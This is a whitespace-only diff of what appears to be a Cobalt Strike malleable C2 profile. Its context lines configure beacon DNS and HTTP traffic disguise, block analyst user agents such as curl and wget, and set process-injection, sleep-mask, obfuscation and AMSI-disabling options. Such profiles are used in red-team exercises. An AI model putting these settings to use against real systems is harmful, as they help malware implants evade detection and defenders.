@@ -22,7 +22,7 @@ dns-beacon {
     set maxdns               "255";
     set dns_stager_prepend   ".wwwds.";
     set dns_stager_subhost   ".e2867.dsca.";
-     
+
     # DNS subhost override options added in 4.3:
     set beacon               "d-bx.";
     set get_A                "d-1ax.";
@@ -74,7 +74,7 @@ http-config {
     header "Server" "nginx";
 
     set trust_x_forwarded_for "false";
-    
+
     set block_useragents "curl*,lynx*,wget*";
 }
 
@@ -86,13 +86,13 @@ http-get {
     set uri "/login /config /admin";
 
     #set verb "POST";
-    
+
     client {
 
         header "Host" "whatever.com";
         header "Connection" "close";
 
-	   
+
     metadata {
         #base64
         base64url;
@@ -114,7 +114,7 @@ http-get {
 
     server {
         #header "Server" "nginx";
- 
+
         output {
 
             netbios;
@@ -122,7 +122,7 @@ http-get {
             #base64;
             #base64url;
             #mask;
-            	       
+
 	    prepend "content=";
 
 	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
@@ -138,13 +138,13 @@ http-get "variant_name_get" {
     set uri "/uri1 /uri2 /uri3";
 
     #set verb "POST";
-    
+
     client {
 
         header "Host" "whatever.com";
         header "Connection" "close";
 
-	   
+
     metadata {
 
         base64url;
@@ -162,11 +162,11 @@ http-get "variant_name_get" {
 
     server {
         #header "Server" "nginx";
- 
+
         output {
 
             netbios;
-            	       
+
 	    prepend "content=";
 
 	    append "\n<meta name=\n";
@@ -178,7 +178,7 @@ http-get "variant_name_get" {
 
 ###HTTP-Post Block###
 http-post {
-    
+
     set uri "/Login /Config /Admin";
     set verb "GET";
     #set verb "POST";
@@ -186,10 +186,10 @@ http-post {
     client {
 
 	header "Host" "whatever.com";
-	header "Connection" "close";     
-        
+	header "Connection" "close";
+
         output {
-            base64url; 
+            base64url;
 	    parameter "testParam";
         }
 
@@ -205,8 +205,8 @@ http-post {
         #header "Server" "nginx";
 
         output {
-            netbios;	    
-	   
+            netbios;
+
 	    prepend "content=";
 
 	    append "\n<meta name=\"msvalidate.01\" content=\"63E628E67E6AD849F4185FA9AA7ABACA\">\n";
@@ -218,7 +218,7 @@ http-post {
 
 ###HTTP-POST VARIANT###
 http-post "variant_name_post" {
-    
+
     set uri "/Uri1 /Uri2 /Uri3";
     set verb "GET";
     #set verb "POST";
@@ -226,10 +226,10 @@ http-post "variant_name_post" {
     client {
 
 	header "Host" "whatever.com";
-	header "Connection" "close";     
-        
+	header "Connection" "close";
+
         output {
-            base64url; 
+            base64url;
 	    parameter "testParam";
         }
 
@@ -244,8 +244,8 @@ http-post "variant_name_post" {
         #header "Server" "nginx";
 
         output {
-            netbios;	    
-	   
+            netbios;
+
 	    prepend "content=";
 
 	    append "\n<meta name=\n";
@@ -264,17 +264,17 @@ http-stager {
     client {
         header "Host" "whatever.com";
         header "Connection" "close";
-	
+
 	#parameter "test1" "test2";
     }
 
     server {
         #header "Server" "nginx";
-	
+
 	output {
-	
+
 	    prepend "content=";
-	    
+
 	    append "</script>\n";
 	    print;
 	}
@@ -297,13 +297,13 @@ stage {
     set stomppe	        "true";
     set obfuscate	"true";
     set rich_header     "";
-    
-    #new 4.2. options   
+
+    #new 4.2. options
     #set allocator "HeapAlloc";
     #set magic_mz_x86 "MZRE";
     #set magic_mz_x64 "MZAR";
     #set magic_pe "PE";
-    
+
     set sleep_mask "true";
     set smartinject "true";
 
@@ -324,20 +324,20 @@ stage {
 
     #string "something";
     #data "something";
-    stringw "something"; 
+    stringw "something";
 }
 
 ###Process Inject Block###
 process-inject {
 
-    set allocator "NtMapViewOfSection";		
+    set allocator "NtMapViewOfSection";
 
     set min_alloc "16700";
 
-    set userwx "false";  
-    
+    set userwx "false";
+
     set startrwx "true";
-        
+
     transform-x86 {
         prepend "\x90\x90\x90";
     }
@@ -347,7 +347,7 @@ process-inject {
 
     execute {
         #CreateThread;
-        #CreateRemoteThread;       
+        #CreateRemoteThread;
 
         CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
 
@@ -374,7 +374,7 @@ post-ex {
     set smartinject "true";
 
     set amsi_disable "true";
-    
+
     #new 4.2 options
     set thread_hint "ntdll.dll!RtlUserThreadStart";
     set pipename "DserNamePipe##";
